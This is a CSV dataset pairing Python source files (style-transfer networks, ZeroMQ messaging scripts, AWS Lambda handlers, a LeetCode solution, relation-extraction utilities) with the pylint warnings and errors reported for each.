input,output
"1   import torch
2   import torch.nn as nn
3   import copy
4   
5   
6   normalised_vgg_relu5_1 = nn.Sequential(
7       nn.Conv2d(3, 3, 1),
8       nn.ReflectionPad2d((1, 1, 1, 1)),
9       nn.Conv2d(3, 64, 3),
10       nn.ReLU(),
11       nn.ReflectionPad2d((1, 1, 1, 1)),
12       nn.Conv2d(64, 64, 3),
13       nn.ReLU(),
14       nn.MaxPool2d(2, ceil_mode=True),
15       nn.ReflectionPad2d((1, 1, 1, 1)),
16       nn.Conv2d(64, 128, 3),
17       nn.ReLU(),
18       nn.ReflectionPad2d((1, 1, 1, 1)),
19       nn.Conv2d(128, 128, 3),
20       nn.ReLU(),
21       nn.MaxPool2d(2, ceil_mode=True),
22       nn.ReflectionPad2d((1, 1, 1, 1)),
23       nn.Conv2d(128, 256, 3),
24       nn.ReLU(),
25       nn.ReflectionPad2d((1, 1, 1, 1)),
26       nn.Conv2d(256, 256, 3),
27       nn.ReLU(),
28       nn.ReflectionPad2d((1, 1, 1, 1)),
29       nn.Conv2d(256, 256, 3),
30       nn.ReLU(),
31       nn.ReflectionPad2d((1, 1, 1, 1)),
32       nn.Conv2d(256, 256, 3),
33       nn.ReLU(),
34       nn.MaxPool2d(2, ceil_mode=True),
35       nn.ReflectionPad2d((1, 1, 1, 1)),
36       nn.Conv2d(256, 512, 3),
37       nn.ReLU(),
38       nn.ReflectionPad2d((1, 1, 1, 1)),
39       nn.Conv2d(512, 512, 3),
40       nn.ReLU(),
41       nn.ReflectionPad2d((1, 1, 1, 1)),
42       nn.Conv2d(512, 512, 3),
43       nn.ReLU(),
44       nn.ReflectionPad2d((1, 1, 1, 1)),
45       nn.Conv2d(512, 512, 3),
46       nn.ReLU(),
47       nn.MaxPool2d(2, ceil_mode=True),
48       nn.ReflectionPad2d((1, 1, 1, 1)),
49       nn.Conv2d(512, 512, 3),
50       nn.ReLU()
51   )
52   
53   
54   class NormalisedVGG(nn.Module):
55   
56       def __init__(self, pretrained_path=None):
57           super().__init__()
58           self.net = normalised_vgg_relu5_1
59           if pretrained_path is not None:
60               self.net.load_state_dict(torch.load(pretrained_path, map_location=lambda storage, loc: storage))
61   
62       def forward(self, x, target):
63           if target == 'relu1_1':
64               return self.net[:4](x)
65           elif target == 'relu2_1':
66               return self.net[:11](x)
67           elif target == 'relu3_1':
68               return self.net[:18](x)
69           elif target == 'relu4_1':
70               return self.net[:31](x)
71           elif target == 'relu5_1':
72               return self.net(x)
73   
74   
75   vgg_decoder_relu5_1 = nn.Sequential(
76       nn.ReflectionPad2d((1, 1, 1, 1)),
77       nn.Conv2d(512, 512, 3),
78       nn.ReLU(),
79       nn.Upsample(scale_factor=2),
80       nn.ReflectionPad2d((1, 1, 1, 1)),
81       nn.Conv2d(512, 512, 3),
82       nn.ReLU(),
83       nn.ReflectionPad2d((1, 1, 1, 1)),
84       nn.Conv2d(512, 512, 3),
85       nn.ReLU(),
86       nn.ReflectionPad2d((1, 1, 1, 1)),
87       nn.Conv2d(512, 512, 3),
88       nn.ReLU(),
89       nn.ReflectionPad2d((1, 1, 1, 1)),
90       nn.Conv2d(512, 256, 3),
91       nn.ReLU(),
92       nn.Upsample(scale_factor=2),
93       nn.ReflectionPad2d((1, 1, 1, 1)),
94       nn.Conv2d(256, 256, 3),
95       nn.ReLU(),
96       nn.ReflectionPad2d((1, 1, 1, 1)),
97       nn.Conv2d(256, 256, 3),
98       nn.ReLU(),
99       nn.ReflectionPad2d((1, 1, 1, 1)),
100       nn.Conv2d(256, 256, 3),
101       nn.ReLU(),
102       nn.ReflectionPad2d((1, 1, 1, 1)),
103       nn.Conv2d(256, 128, 3),
104       nn.ReLU(),
105       nn.Upsample(scale_factor=2),
106       nn.ReflectionPad2d((1, 1, 1, 1)),
107       nn.Conv2d(128, 128, 3),
108       nn.ReLU(),
109       nn.ReflectionPad2d((1, 1, 1, 1)),
110       nn.Conv2d(128, 64, 3),
111       nn.ReLU(),
112       nn.Upsample(scale_factor=2),
113       nn.ReflectionPad2d((1, 1, 1, 1)),
114       nn.Conv2d(64, 64, 3),
115       nn.ReLU(),
116       nn.ReflectionPad2d((1, 1, 1, 1)),
117       nn.Conv2d(64, 3, 3)
118       )
119   
120   
121   class Decoder(nn.Module):
122       def __init__(self, target, pretrained_path=None):
123           super().__init__()
124           if target == 'relu1_1':
125               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-5:]))    # current -2
126           elif target == 'relu2_1':
127               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-9:]))
128           elif target == 'relu3_1':
129               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-16:]))
130           elif target == 'relu4_1':
131               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())[-29:]))
132           elif target == 'relu5_1':
133               self.net = nn.Sequential(*copy.deepcopy(list(vgg_decoder_relu5_1.children())))
134   
135           if pretrained_path is not None:
136               self.net.load_state_dict(torch.load(pretrained_path, map_location=lambda storage, loc: storage))
137   
138       def forward(self, x):
139           return self.net(x)
","2 - refactor: consider-using-from-import
63 - refactor: no-else-return
62 - refactor: inconsistent-return-statements
"
"1   import zmq
2   
3   PUB_ADDR = 'ipc:///tmp/pub';
4   SUB_ADDR = 'ipc:///tmp/sub';
5   
6   class zcomm:
7   
8       def __init__(self):
9           self.ctx = zmq.Context()
10           self.pub = self.ctx.socket(zmq.PUB)
11           self.pub.connect(PUB_ADDR)
12           self.sub = self.ctx.socket(zmq.SUB)
13           self.sub.connect(SUB_ADDR)
14           self.callbacks = {} # maps channels -> callbacks
15   
16       def subscribe(self, channel, callback):
17           self.sub.setsockopt(zmq.SUBSCRIBE, channel)
18           self.callbacks[channel] = callback
19   
20       def publish(self, channel, data):
21           self.pub.send_multipart([channel, data])
22   
23       def handle(self):
24           channel, msg = self.sub.recv_multipart()
25           if channel in self.callbacks:
26               self.callbacks[channel](channel, msg)
27           elif '' in self.callbacks:
28               self.callbacks[''](channel, msg)
29   
30       def run(self):
31           while True:
32               self.handle()
","3 - warning: unnecessary-semicolon
4 - warning: unnecessary-semicolon
"
"1   #!/usr/bin/env python
2   import itertools
3   import sys
4   import time
5   from zcomm import zcomm
6   
7   HZ = 1
8   
9   def main(argv):
10       z = zcomm()
11   
12       msg_counter = itertools.count()
13       while True:
14           msg = str(msg_counter.next())
15           z.publish('FROB_DATA', msg);
16           time.sleep(1/float(HZ))
17   
18   if __name__ == ""__main__"":
19       try:
20           main(sys.argv)
21       except KeyboardInterrupt:
22           pass
","15 - warning: unnecessary-semicolon
14 - error: no-member
9 - warning: unused-argument
"
"1   #!/usr/bin/env python
2   import sys
3   import time
4   from zcomm import zcomm
5   
6   def handle_msg(channel, data):
7       print '   channel:%s, data:%s' % (channel, data)
8   
9   def main(argv):
10       z = zcomm()
11       z.subscribe('', handle_msg)
12       z.run()
13   
14   if __name__ == ""__main__"":
15       try:
16           main(sys.argv)
17       except KeyboardInterrupt:
18           pass
","7 - error: syntax-error
"
"1   #!/usr/bin/env python
2   import zmq
3   
4   SUB_ADDR = 'ipc:///tmp/sub'
5   PUB_ADDR = 'ipc:///tmp/pub'
6   
7   def main():
8   
9       try:
10           context = zmq.Context(1)
11   
12           userpub = context.socket(zmq.SUB)
13           userpub.bind(PUB_ADDR)
14           userpub.setsockopt(zmq.SUBSCRIBE, """")
15   
16           usersub = context.socket(zmq.PUB)
17           usersub.bind(SUB_ADDR)
18   
19           zmq.device(zmq.FORWARDER, userpub, usersub)
20       except Exception, e:
21           print e
22           print ""bringing down zmq device""
23       except KeyboardInterrupt:
24           pass
25       finally:
26           pass
27           userpub.close()
28           usersub.close()
29           context.term()
30   
31   if __name__ == ""__main__"":
32       main()
","20 - error: syntax-error
"
"1   # AC:
2   # from others' solution
3   #
4   class Solution(object):
5       def distinctEchoSubstrings(self, S):
6           N = len(S)
7           P, MOD = 37, 344555666677777  # MOD is prime
8           Pinv = pow(P, MOD - 2, MOD)
9           
10           prefix = [0]
11           pwr = 1
12           ha = 0
13           
14           for x in map(ord, S):
15               ha = (ha + pwr * x) % MOD
16               pwr = pwr * P % MOD
17               prefix.append(ha)
18           
19           seen = set()
20           pwr = 1
21           for length in range(1, N // 2 + 1):
22               pwr = pwr * P % MOD  # pwr = P^length
23               for i in range(N - 2 * length + 1):
24                   left = (prefix[i + length] - prefix[i]) * pwr % MOD  # hash of s[i:i+length] * P^length
25                   right = (prefix[i + 2 * length] - prefix[i + length]) % MOD  # hash of s[i+length:i+2*length]
26                   if left == right:
27                       seen.add(left * pow(Pinv, i, MOD) % MOD)  # left * P^-i  is the canonical representation
28           return len(seen)","4 - refactor: useless-object-inheritance
4 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Wed Oct 24 09:50:29 2018
4   
5   @author: fd
6   """"""
7   
8   import json
9   
10   dic = {
11       ""真实流量测试"":
12           {
13               ""dspflow"": [""flow.pcap""],
14   
15               ""flow"": [""flow2.pcap"", ""3.pcap""],
16           },
17   
18       ""恶意流量测试"":
19           {
20               ""情况1"": [""6.pcap""],
21   
22               ""情况2"": [""7.pcap"", ""8.pcap""],
23               ""情况3"": [""9.pcap"", ""10.pcap""],
24           },
25       ""具体流量测试"":
26           {
27               ""ARP"": [""arp.pcap""],
28               ""DB2"": [""db2.pcap""],
29               ""DNS"": [""dns.pcap""],
30               ""FTP"": [""dns.pcap""],
31               ""HTTP"": [""http.pcap""],
32               ""HTTPS"": [""https.pcap""],
33               ""MEMCACHE"": [""memcached.pcap""],
34               ""MONGO"": [""mongo.pcap""],
35               ""MYSQL"": [""mysql.pcap""],
36               ""ORACLE"": [""oracle.pcap""],
37               ""REDIS"": [""redis.pcap""],
38               ""SMTP"": [""smtp.pcap""],
39               ""SNMPv1"": [""snmp1.pcap""],
40               ""SNMPv2"": [""snmp2.pcap""],
41               ""SNMPv3"": [""snmp3.pcap""],
42               ""SSH"": [""ssh.pcap""],
43               ""SSL"": [""ssl.pcap""],
44               ""SYBASE"": [""sybase.pcap""],
45               ""TELNET"": [""telnet.pcap""],
46               ""UDP"": [""udp.pcap""],
47               ""VLAN"": [""vlan.pcap""],
48           }
49   
50   }
51   with open(""config.json"",""w"") as dump_f:
52       json.dump(dic,dump_f,ensure_ascii=False)
53   
54   with open('config.json', 'r') as json_file:
55       """"""
56       读取该json文件时，先按照gbk的方式对其解码再编码为utf-8的格式
57       """"""
58       data = json_file.read()
59       print(type(data))    # type(data) = 'str'
60       result = json.loads(data)
61       print(result)
","51 - warning: unspecified-encoding
54 - warning: unspecified-encoding
55 - warning: pointless-string-statement
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Tue Nov 27 20:07:59 2018
4   
5   @author: Imen
6   """"""
7   
8   import numpy as np
9   import pandas as pd
10   from sklearn.cluster import KMeans
11   import matplotlib.pyplot as plt
12   from sklearn.datasets.samples_generator import make_blobs
13   
14   #Create a database of random values of 4 features and a fixed number of clusters 
15   n_clusters=6
16   dataset,y=make_blobs(n_samples=200,n_features=4,centers=n_clusters)
17   #plt.scatter(dataset[:,2],dataset[:,3])
18   
19   #Firstly,i will calculate Vsc for this number of clusters
20   #Create the k-means 
21   kmeans=KMeans(init=""k-means++"",n_clusters=n_clusters,random_state=0)
22   kmeans.fit(dataset)
23   mu_i=kmeans.cluster_centers_
24   k_means_labels=kmeans.labels_
25   mu=dataset.mean(axis=0)
26   SB=np.zeros((4,4))
27   for line in mu_i:
28       diff1=line.reshape(1,4)-mu.reshape(1,4)
29       diff2=np.transpose(line.reshape(1,4)-mu.reshape(1,4))
30       SB+=diff1*diff2
31   Sw=np.zeros((4,4))
32   sum_in_cluster=np.zeros((4,4))
33   comp_c=0
34   for k in range(n_clusters):
35       mes_points=(k_means_labels==k)
36       cluster_center=mu_i[k]
37       for i in dataset[mes_points]:
38           diff11=i.reshape(1,4)-cluster_center.reshape(1,4)
39           diff22=np.transpose(i.reshape(1,4)-cluster_center.reshape(1,4))
40           sum_in_cluster+=diff11*diff22
41       Sw+=sum_in_cluster
42       comp_c+=np.trace(Sw)
43   
44   sep_c=np.trace(SB)
45   Vsc=sep_c/comp_c
46   print(""For n_clusters="",n_clusters,"" => Vsc="",Vsc)
47   
48   #Secondly,i will determine Vsc for each number of cluster from 2 to 10
49   #Define a function validity_index
50   def validity_index(c):
51       kmeans=KMeans(init=""k-means++"",n_clusters=c,random_state=0)
52       kmeans.fit(dataset)
53       #mu_i is the centers of clusters
54       mu_i=kmeans.cluster_centers_
55       k_means_labels=kmeans.labels_
56       #mu is the center of the whole dataset
57       mu=dataset.mean(axis=0)
58       #initialize the between clusters matrix
59       SB=np.zeros((4,4))
60       for line in mu_i:
61           diff1=line.reshape(1,4)-mu.reshape(1,4)
62           diff2=np.transpose(line.reshape(1,4)-mu.reshape(1,4))
63           SB+=diff1*diff2
64       comp_c=0
65       #initialize the within matrix
66       Sw=np.zeros((4,4))
67       sum_in_cluster=np.zeros((4,4))
68       for k in range(c):
69           mes_points=(k_means_labels==k)
70           cluster_center=mu_i[k]
71           for i in dataset[mes_points]:
72               diff11=i.reshape(1,4)-cluster_center.reshape(1,4)
73               diff22=np.transpose(i.reshape(1,4)-cluster_center.reshape(1,4))
74               sum_in_cluster+=diff11*diff22
75           Sw+=sum_in_cluster
76           #calculate the compactness in each cluster
77           comp_c+=np.trace(Sw)
78       #define the separation between clusters
79       sep_c=np.trace(SB)
80       #determin the Vsc
81       Vsc=sep_c/comp_c
82       return Vsc
83   #We have to find that the max Vsc is for the n_cluster defined initially
84   Vsc_vector=[]
85   cc=[2,3,4,5,6,7,8,9,10]
86   for i in cc:
87       Vsc_vector.append(validity_index(i))
88   print(""Number of clusters which has max of Vsc:"",Vsc_vector.index(max(Vsc_vector))+2 ,""=> Vsc="",max(Vsc_vector))
","50 - refactor: too-many-locals
51 - warning: redefined-outer-name
54 - warning: redefined-outer-name
55 - warning: redefined-outer-name
57 - warning: redefined-outer-name
59 - warning: redefined-outer-name
60 - warning: redefined-outer-name
61 - warning: redefined-outer-name
62 - warning: redefined-outer-name
64 - warning: redefined-outer-name
66 - warning: redefined-outer-name
67 - warning: redefined-outer-name
68 - warning: redefined-outer-name
69 - warning: redefined-outer-name
70 - warning: redefined-outer-name
71 - warning: redefined-outer-name
72 - warning: redefined-outer-name
73 - warning: redefined-outer-name
79 - warning: redefined-outer-name
81 - warning: redefined-outer-name
9 - warning: unused-import
11 - warning: unused-import
"
1   AWS_SCIPY_ARN = 'arn:aws:lambda:region:account_id:layer:AWSLambda-Python37-SciPy1x:2',"Clean Code: No Issues Detected
"
"1   def lambda_handler(event, context):
2       if event['parallel_no'] % 2 == 0:
3           raise Exception('偶数です')
4   
5       return {
6           'message': event['message'],
7           'const_value': event['const_value']
8       }
","3 - warning: broad-exception-raised
1 - warning: unused-argument
"
"1   def lambda_handler(event, context):
2       if event['parallel_no'] == 1:
3           raise Exception('強制的にエラーとします')
4   
5       return 'only 3rd message.'
","3 - warning: broad-exception-raised
1 - warning: unused-argument
"
"1   #!/usr/bin/env python3
2   
3   from aws_cdk import core
4   
5   from step_functions.step_functions_stack import StepFunctionsStack
6   
7   
8   app = core.App()
9   
10   # CFnのStack名を第2引数で渡す
11   StepFunctionsStack(app, 'step-functions')
12   
13   app.synth()
","Clean Code: No Issues Detected
"
"1   import json
2   
3   
4   def lambda_handler(event, context):
5       # {
6       #   ""resource"": ""arn:aws:lambda:region:id:function:sfn_error_lambda"",
7       #   ""input"": {
8       #     ""Error"": ""Exception"",
9       #     ""Cause"": ""{\""errorMessage\"": \""\\u5076\\u6570\\u3067\\u3059\"",
10       #                \""errorType\"": \""Exception\"",
11       #                \""stackTrace\"": [\""  File \\\""/var/task/lambda_function.py\\\"", line 5,
12       #                   in lambda_handler\\n    raise Exception('\\u5076\\u6570\\u3067\\u3059')
13       #               \\n\""]}""
14       #   },
15       #   ""timeoutInSeconds"": null
16       # }
17   
18       return {
19           # JSONをPythonオブジェクト化することで、文字化けを直す
20           'error_message': json.loads(event['Cause']),
21       }
","4 - warning: unused-argument
"
"1   import os
2   import boto3
3   from numpy.random import rand
4   
5   
6   def lambda_handler(event, context):
7       body = f'{event[""message""]} \n value: {rand()}'
8       client = boto3.client('s3')
9       client.put_object(
10           Bucket=os.environ['BUCKET_NAME'],
11           Key='sfn_first.txt',
12           Body=body,
13       )
14   
15       return {
16           'body': body,
17           'message': event['message'],
18       }
","6 - warning: unused-argument
"
"1   import time
2   import cPickle
3   import numpy as np
4   import torch
5   
6   class InstanceBag(object):
7   	def __init__(self, entities, rel, num, sentences, positions, entitiesPos):
8   		self.entities = entities
9   		self.rel = rel
10   		self.num = num
11   		self.sentences = sentences
12   		self.positions = positions
13   		self.entitiesPos = entitiesPos
14   
15   def bags_decompose(data_bags):
16       bag_sent = [data_bag.sentences for data_bag in data_bags]
17       bag_pos = [data_bag.positions for data_bag in data_bags]
18       bag_num = [data_bag.num for data_bag in data_bags]
19       bag_rel = [data_bag.rel for data_bag in data_bags]
20       bag_epos = [data_bag.entitiesPos for data_bag in data_bags]
21       return [bag_rel, bag_num, bag_sent, bag_pos, bag_epos]
22   
23   def select_instance(rels, nums, sents, poss, eposs, model):
24       batch_x = []
25       batch_len = []
26       batch_epos = []
27       batch_y = []
28       for bagIndex, insNum in enumerate(nums):
29           maxIns = 0
30           maxP = -1
31           if insNum > 1:
32               for m in range(insNum):
33               	insX = sents[bagIndex][m]
34                   epos = eposs[bagIndex][m]
35                   sel_x, sel_len, sel_epos = prepare_data([insX], [epos])
36                   results = model(sel_x, sel_len, sel_epos)
37                   tmpMax = results.max()
38                   if tmpMax > maxP:
39                       maxIns = m
40                       maxP=tmpMax
41   
42           batch_x.append(sents[bagIndex][maxIns])
43           batch_epos.append(eposs[bagIndex][maxIns])
44           batch_y.append(rels[bagIndex])
45       
46       batch_x, batch_len, batch_epos = prepare_data(batch_x, batch_epos)
47       batch_y = torch.LongTensor(np.array(batch_y).astype(""int32"")).cuda()
48   
49       return [batch_x, batch_len, batch_epos, batch_y]
50   
51   def prepare_data(sents, epos):
52       lens = [len(sent) for sent in sents]
53   
54       n_samples = len(lens)
55       max_len = max(lens)
56   
57       batch_x = np.zeros((n_samples, max_len)).astype(""int32"")
58       for idx, s in enumerate(sents):
59           batch_x[idx, :lens[idx]] = s
60   
61       batch_len = np.array(lens).astype(""int32"")
62       batch_epos = np.array(epos).astype(""int32"")
63   
64       return torch.LongTensor(batch_x).cuda(), torch.LongTensor(batch_len).cuda(), torch.LongTensor(batch_epos).cuda()
","34 - error: syntax-error
"
"1   import sys
2   import re
3   import numpy as np
4   import cPickle as pkl
5   import codecs
6   
7   import logging
8   
9   from data_iterator import *
10   
11   logger = logging.getLogger()
12   extra_token = [""<PAD>"", ""<UNK>""]
13   
14   def display(msg):
15   	print(msg)
16   	logger.info(msg)
17   
18   def datafold(filename):
19   	f = open(filename, 'r')
20   	data = []
21   	while 1:
22   		line = f.readline()
23   		if not line:
24   			break
25   		entities = map(int, line.split(' '))
26   		line = f.readline()
27   		bagLabel = line.split(' ')
28   
29   		rel = map(int, bagLabel[0:-1])
30   		num = int(bagLabel[-1])
31   		positions = []
32   		sentences = []
33   		entitiesPos = []
34   		for i in range(0, num):
35   			sent = f.readline().split(' ')
36   			positions.append(map(int, sent[0:2]))
37   			epos = map(int, sent[0:2])
38   			epos.sort()
39   			entitiesPos.append(epos)
40   			sentences.append(map(int, sent[2:-1]))
41   		ins = InstanceBag(entities, rel, num, sentences, positions, entitiesPos)
42   		data += [ins]
43   	f.close()
44   	return data
45   
46   def dicfold(textfile):
47   	vocab = []
48   	with codecs.open(textfile, ""r"", encoding = ""utf8"") as f:
49   		for line in f:
50   			line = line.strip()
51   			if line:
52   				vocab.append(line)
53   	return vocab
54   
55   def build_word2idx(vocab, textFile):
56   	msg = ""Building word2idx...""
57   	display(msg)
58   
59   	pre_train_emb = []
60   	part_point = len(vocab)
61   	
62   	if textFile:
63   		word2emb = load_emb(vocab, textFile)
64   
65   		pre_train_vocab = []
66   		un_pre_train_vocab = []
67   
68   		for word in vocab:
69   			if word in word2emb:
70   				pre_train_vocab.append(word)
71   				pre_train_emb.append(word2emb[word])
72   			else:
73   				un_pre_train_vocab.append(word)
74   		
75   		part_point = len(un_pre_train_vocab)
76   		un_pre_train_vocab.extend(pre_train_vocab)
77   		vocab = un_pre_train_vocab
78   
79   	word2idx = {}
80   	for v, k in enumerate(extra_token):
81   		word2idx[k] = v
82   
83   	for v, k in enumerate(vocab):
84   		word2idx[k] = v + 2
85   
86   	part_point += 2
87   
88   	return word2idx, pre_train_emb, part_point
89   
90   def load_emb(vocab, textFile):
91   	msg = 'load emb from ' + textFile
92   	display(msg)
93   
94   	vocab_set = set(vocab)
95   	word2emb = {}
96   
97   	emb_p = re.compile(r"" |\t"")
98   	count = 0
99   	with codecs.open(textFile, ""r"", ""utf8"") as filein:
100   		for line in filein:
101   			count += 1
102   			array = emb_p.split(line.strip())
103   			word = array[0]
104   			if word in vocab_set:
105   				vector = [float(array[i]) for i in range(1, len(array))]
106   				word2emb[word] = vector
107   	
108   	del vocab_set
109   	
110   	msg = ""find %d words in %s"" %(count, textFile)
111   	display(msg)
112   
113   	msg = ""Summary: %d words in the vocabulary and %d of them appear in the %s"" %(len(vocab), len(word2emb), textFile)
114   	display(msg)
115   
116   	return word2emb
117   
118   def positive_evaluation(predict_results):
119   	predict_y = predict_results[0]
120   	predict_y_prob = predict_results[1]
121   	y_given = predict_results[2]
122   
123   	positive_num = 0
124   	#find the number of positive examples
125   	for yi in range(y_given.shape[0]):
126   		if y_given[yi, 0] > 0:
127   			positive_num += 1
128   	# if positive_num == 0:
129   	#	  positive_num = 1
130   	# sort prob
131   	index = np.argsort(predict_y_prob)[::-1]
132   
133   	all_pre = [0]
134   	all_rec = [0]
135   	p_n = 0
136   	p_p = 0
137   	n_p = 0
138   	# print y_given.shape[0]
139   	for i in range(y_given.shape[0]):
140   		labels = y_given[index[i],:] # key given labels
141   		py = predict_y[index[i]] # answer
142   
143   		if labels[0] == 0:
144   			# NA bag
145   			if py > 0:
146   				n_p += 1
147   		else:
148   			# positive bag
149   			if py == 0:
150   				p_n += 1
151   			else:
152   				flag = False
153   				for j in range(y_given.shape[1]):
154   					if j == -1:
155   						break
156   					if py == labels[j]:
157   						flag = True # true positive
158   						break
159   					if flag:
160   						p_p += 1
161   		if (p_p+n_p) == 0:
162   			precision = 1
163   		else:
164   			precision = float(p_p)/(p_p+n_p)
165   		recall = float(p_p)/positive_num
166   		if precision != all_pre[-1] or recall != all_rec[-1]:
167   			all_pre.append(precision)
168   			all_rec.append(recall)
169   	return [all_pre[1:], all_rec[1:]]","15 - warning: bad-indentation
16 - warning: bad-indentation
19 - warning: bad-indentation
20 - warning: bad-indentation
21 - warning: bad-indentation
22 - warning: bad-indentation
23 - warning: bad-indentation
24 - warning: bad-indentation
25 - warning: bad-indentation
26 - warning: bad-indentation
27 - warning: bad-indentation
29 - warning: bad-indentation
30 - warning: bad-indentation
31 - warning: bad-indentation
32 - warning: bad-indentation
33 - warning: bad-indentation
34 - warning: bad-indentation
35 - warning: bad-indentation
36 - warning: bad-indentation
37 - warning: bad-indentation
38 - warning: bad-indentation
39 - warning: bad-indentation
40 - warning: bad-indentation
41 - warning: bad-indentation
42 - warning: bad-indentation
43 - warning: bad-indentation
44 - warning: bad-indentation
47 - warning: bad-indentation
48 - warning: bad-indentation
49 - warning: bad-indentation
50 - warning: bad-indentation
51 - warning: bad-indentation
52 - warning: bad-indentation
53 - warning: bad-indentation
56 - warning: bad-indentation
57 - warning: bad-indentation
59 - warning: bad-indentation
60 - warning: bad-indentation
62 - warning: bad-indentation
63 - warning: bad-indentation
65 - warning: bad-indentation
66 - warning: bad-indentation
68 - warning: bad-indentation
69 - warning: bad-indentation
70 - warning: bad-indentation
71 - warning: bad-indentation
72 - warning: bad-indentation
73 - warning: bad-indentation
75 - warning: bad-indentation
76 - warning: bad-indentation
77 - warning: bad-indentation
79 - warning: bad-indentation
80 - warning: bad-indentation
81 - warning: bad-indentation
83 - warning: bad-indentation
84 - warning: bad-indentation
86 - warning: bad-indentation
88 - warning: bad-indentation
91 - warning: bad-indentation
92 - warning: bad-indentation
94 - warning: bad-indentation
95 - warning: bad-indentation
97 - warning: bad-indentation
98 - warning: bad-indentation
99 - warning: bad-indentation
100 - warning: bad-indentation
101 - warning: bad-indentation
102 - warning: bad-indentation
103 - warning: bad-indentation
104 - warning: bad-indentation
105 - warning: bad-indentation
106 - warning: bad-indentation
108 - warning: bad-indentation
110 - warning: bad-indentation
111 - warning: bad-indentation
113 - warning: bad-indentation
114 - warning: bad-indentation
116 - warning: bad-indentation
119 - warning: bad-indentation
120 - warning: bad-indentation
121 - warning: bad-indentation
123 - warning: bad-indentation
125 - warning: bad-indentation
126 - warning: bad-indentation
127 - warning: bad-indentation
131 - warning: bad-indentation
133 - warning: bad-indentation
134 - warning: bad-indentation
135 - warning: bad-indentation
136 - warning: bad-indentation
137 - warning: bad-indentation
139 - warning: bad-indentation
140 - warning: bad-indentation
141 - warning: bad-indentation
143 - warning: bad-indentation
145 - warning: bad-indentation
146 - warning: bad-indentation
147 - warning: bad-indentation
149 - warning: bad-indentation
150 - warning: bad-indentation
151 - warning: bad-indentation
152 - warning: bad-indentation
153 - warning: bad-indentation
154 - warning: bad-indentation
155 - warning: bad-indentation
156 - warning: bad-indentation
157 - warning: bad-indentation
158 - warning: bad-indentation
159 - warning: bad-indentation
160 - warning: bad-indentation
161 - warning: bad-indentation
162 - warning: bad-indentation
163 - warning: bad-indentation
164 - warning: bad-indentation
165 - warning: bad-indentation
166 - warning: bad-indentation
167 - warning: bad-indentation
168 - warning: bad-indentation
169 - warning: bad-indentation
9 - warning: wildcard-import
19 - warning: unspecified-encoding
38 - error: no-member
41 - error: undefined-variable
19 - refactor: consider-using-with
34 - warning: unused-variable
118 - refactor: too-many-locals
118 - refactor: too-many-branches
1 - warning: unused-import
4 - warning: unused-import
"
"1   from module import *
2   from util import *
3   from data_iterator import *
","1 - warning: wildcard-import
2 - warning: wildcard-import
3 - warning: wildcard-import
"
